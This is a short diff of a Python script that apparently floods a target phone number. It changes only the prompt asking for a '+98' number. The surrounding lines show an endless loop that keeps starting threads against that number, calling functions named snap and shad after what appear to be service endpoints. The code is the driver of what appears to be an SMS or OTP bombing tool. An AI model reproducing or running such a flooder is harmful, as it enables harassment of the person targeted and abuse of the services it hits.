@@ -119,7 +119,7 @@ def bama(phone):
         print ("Error!")
 
 def main():
-    phone = str(input("Made by @Sardar_Cyberym:) ↦Target Phone (+98xxxxxxx): "))
+    phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
     while True:
         Thread(target=snap, args=[phone]).start()
         Thread(target=shad, args=[phone]).start()
